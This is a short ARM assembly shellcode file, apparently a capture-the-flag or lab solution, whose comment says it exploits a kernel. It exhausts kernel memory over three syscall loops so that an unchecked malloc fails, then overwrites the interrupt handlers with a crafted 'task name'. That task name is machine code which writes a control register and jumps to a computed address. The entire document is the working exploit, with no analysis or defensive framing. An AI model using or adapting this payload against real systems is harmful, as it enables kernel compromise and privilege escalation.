# This shellcode exploits the kernel by allocating all of the kernel's memory in 3 loops, in order to ensure it makes the one
# unchecked malloc call fail, and copy the given task name over the interrupt handlers.  In order to ensure we have a unique
# name each time, we increment the last word of the taskname each call.

beginning:
mov r5, #0x0000

loop:
add r5, r5, #1
str r5, [pc, #0x94]

# Task Name
add r1, pc, #0x74
# Address
movw r2, #0x0000
movt r2, #0x0440
# Length
movw r3, #0x1000
movt r3, #0x0001
# Interrupt number
mov r0, #4

# Make the interrupt call
STMFD SP!, {R4-R12,LR}
SVC 0
LDMFD SP!, {R4-R12,LR}

cmp r5, #1000
bls loop

second_loop:
# allocate 0x104
movw r3, #0x0100
movt r3, #0x0000
mov r0, #4

add r5, r5, #1
str r5, [pc, #0x54]

STMFD SP!, {R4-R12,LR}
SVC 0
LDMFD SP!, {R4-R12,LR}

cmn r0, #1
bne second_loop

third_loop:
# allocate 0x0
movw r3, #0x0008
movt r3, #0x0000
mov r0, #4
mov r7, #0

add r5, r5, #1
str r5, [pc, #0x28]

STMFD SP!, {R4-R12,LR}
SVC 0
LDMFD SP!, {R4-R12,LR}

b third_loop

task_name:
mcr p15, 0, r7, c1, c0, 0
movt r4, #0x03ff
movw r3, #0x1998
movt r3, #0xCC01
and r3, #0x11ffffff
and r3, #0xffff0fff
bx r3
.long 0x00000000
.long 0x00000000
.long 0x00000000
.long 0x00000000
